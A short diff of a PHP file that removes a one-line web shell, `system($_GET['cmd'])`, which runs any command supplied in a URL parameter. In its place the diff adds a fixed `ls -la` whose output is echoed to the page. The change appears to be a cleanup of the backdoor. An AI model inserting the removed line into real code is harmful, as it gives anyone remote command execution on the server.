@@ -1,3 +1,4 @@
 <?php
-system($_GET['cmd']);
+$output = shell_exec('ls -la');
+echo "<pre>$output</pre>";
 ?>
